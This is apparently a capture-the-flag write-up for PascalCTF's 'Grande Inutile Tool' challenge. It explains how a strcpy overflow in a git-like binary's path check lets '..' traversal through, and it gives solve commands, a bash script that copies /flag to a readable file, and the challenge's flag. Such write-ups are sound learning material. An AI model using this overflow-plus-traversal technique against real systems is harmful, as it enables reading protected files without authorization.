# Grande Inutile Tool

## Description
> *Many friends of mine hate git, so I made a git-like tool for them.*
>
> *The flag can be found at `/flag`.*
>
> *You can get a user here: https://git-service.ctf.pascalctf.it*

**Connection:** `ssh <user>@git.ctf.pascalctf.it -p2222`

**Files:** [git](./orig/git)

## Solution
**TL;DR**: Buffer overflow in `validate_path` bypasses path traversal check. Use `./` padding for path resolution, checkout to `/flag`, then use `branch` to write the flag content to a readable location.

### Vulnerability Analysis

The binary implements a git-like tool with path validation in the `validate_path` function. The function has a buffer overflow vulnerability:

1. **Buffer Layout** (in `validate_path`):
   - `rbp-0x30`: 32-byte buffer
   - `rbp-0x10`: 4-byte validity flag
   - `rbp-0x08`: stack canary

2. **Vulnerable Code Flow**:
   ```c
   int valid = 1;
   if (strstr(path, ".."))  // Check for ".."
       valid = 0;
   strcpy(buffer, path);    // Buffer overflow here!
   return valid;
   ```

3. **Exploitation**: By providing a path longer than 32 bytes, we overflow into the `valid` flag. If bytes 33-36 are non-zero, the function returns "valid" despite containing "..".

4. **Key Insight**: Using `X/../../..` fails because `X` doesn't exist as a directory. Instead, use `./././...` which resolves correctly since `.` always exists.

### Exploit Steps

1. Initialize a repository:
   ```bash
   mygit init
   mygit branch test  # Create initial branch structure
   ```

2. Checkout the flag file using path traversal with `./` padding:
   ```bash
   mygit checkout './././././././../../../../../../flag'
   ```
   - This sets HEAD to point to `/flag`
   - When `commit_current()` is called, it reads `/flag` content as the "commit hash"

3. Create a new branch with path traversal to a writable location:
   ```bash
   mygit branch './././././././././../../../../FLAG'
   ```
   - This writes the current "commit hash" (flag content) to `/home/FLAG`
   - The `branch` command calls `commit_current()` which reads `/flag`
   - Then writes that content to the new branch file

4. Read the flag:
   ```bash
   cat /home/FLAG
   ```

### Solve Script
```bash
#!/bin/bash
# Get credentials from https://git-service.ctf.pascalctf.it
# SSH: ssh user@git.ctf.pascalctf.it -p 2222

mygit init
mygit branch test

# Checkout /flag as a "branch" - this makes commit_current() read /flag
mygit checkout './././././././../../../../../../flag'

# Create branch to writable location - writes flag content there
mygit branch './././././././././../../../../FLAG'

# Read the exfiltrated flag (first 40 bytes due to hash length limit)
cat /home/FLAG
```

### Notes
- The flag is truncated to 40 characters due to the commit hash length limit (0x28 bytes)
- Full flag is 44 characters, missing last 4 chars

### Flag
> `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_too}`
